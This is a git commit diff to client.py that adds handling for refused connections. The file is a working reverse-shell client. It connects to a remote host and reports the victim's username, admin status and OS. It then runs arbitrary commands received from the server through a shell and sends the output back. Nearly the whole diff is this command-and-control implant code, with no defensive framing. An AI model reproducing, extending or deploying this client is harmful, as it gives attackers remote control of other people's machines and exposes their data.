06c5ddd20a9b9e9c12e30664862efcb1cb52ad63
Alex M <sasha_midor@yahoo.com>
2023-08-06 20:15:52 -0400

    handle refused connection exception

--- client.py
+++ client.py
@@ -39,57 +39,61 @@ def outbound_message(message):
 
 
 def session_handler():
-    print(f'[+] Connecting to {host_ip}')
-    sock.connect((host_ip, host_port))
-    if platform.system() == 'Windows':
-        outbound_message(os.getlogin())
-        time.sleep(0.2)
-        outbound_message(ctypes.windll.shell32.IsUserAnAdmin())
-        time.sleep(0.2)
-        outbound_message(platform.system())
-    else:
-        outbound_message(pwd.getpwuid(os.getuid())[0])
-        time.sleep(0.2)
-        outbound_message(os.getuid())
-        time.sleep(0.2)
-        outbound_message(platform.system())
-
-    print(f'[+] Connected to {host_ip}')
-    while True:
-        message = inbound_message()
-        print(f'[+] Message received - {message}')
-        if message == 'exit':
-            print('[-] The server has terminated the session.')
-            sock.close()
-            break
-        elif not message:
-            sock.close()
-            break
-        # Change directory script
-        elif message.split(" ")[0] == 'cd':
-            try:
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                cur_dir = os.getcwd()
-                print(f'[+] Changed to {cur_dir}')
-                outbound_message(cur_dir)
-            except FileNotFoundError:
-                outbound_message('Invalid directory. Try again.')
-                continue
-            except IndexError:
-                outbound_message('Argument missing. Try again.')
-
-        # Subprocess command handling
+    try:
+        print(f'[+] Connecting to {host_ip}')
+        sock.connect((host_ip, host_port))
+        if platform.system() == 'Windows':
+            outbound_message(os.getlogin())
+            time.sleep(0.2)
+            outbound_message(ctypes.windll.shell32.IsUserAnAdmin())
+            time.sleep(0.2)
+            outbound_message(platform.system())
         else:
-            command = subprocess.Popen(
-                message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = command.stdout.read() + command.stderr.read()
-            return_code = command.wait()
-            if not output and return_code == 0:
-                output = '[*] Success'
-                outbound_message(output)
+            outbound_message(pwd.getpwuid(os.getuid())[0])
+            time.sleep(0.2)
+            outbound_message(os.getuid())
+            time.sleep(0.2)
+            outbound_message(platform.system())
+
+        print(f'[+] Connected to {host_ip}')
+        while True:
+            message = inbound_message()
+            print(f'[+] Message received - {message}')
+            if message == 'exit':
+                print('[-] The server has terminated the session.')
+                sock.close()
+                break
+            elif not message:
+                sock.close()
+                break
+            # Change directory script
+            elif message.split(" ")[0] == 'cd':
+                try:
+                    directory = str(message.split(" ")[1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    print(f'[+] Changed to {cur_dir}')
+                    outbound_message(cur_dir)
+                except FileNotFoundError:
+                    outbound_message('Invalid directory. Try again.')
+                    continue
+                except IndexError:
+                    outbound_message('Argument missing. Try again.')
+
+            # Subprocess command handling
             else:
-                outbound_message(output.decode())
+                command = subprocess.Popen(
+                    message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                return_code = command.wait()
+                if not output and return_code == 0:
+                    output = '[*] Success'
+                    outbound_message(output)
+                else:
+                    outbound_message(output.decode())
+    except ConnectionRefusedError:
+        print('Connection refused...')
+        pass
 
 
 if __name__ == '__main__':
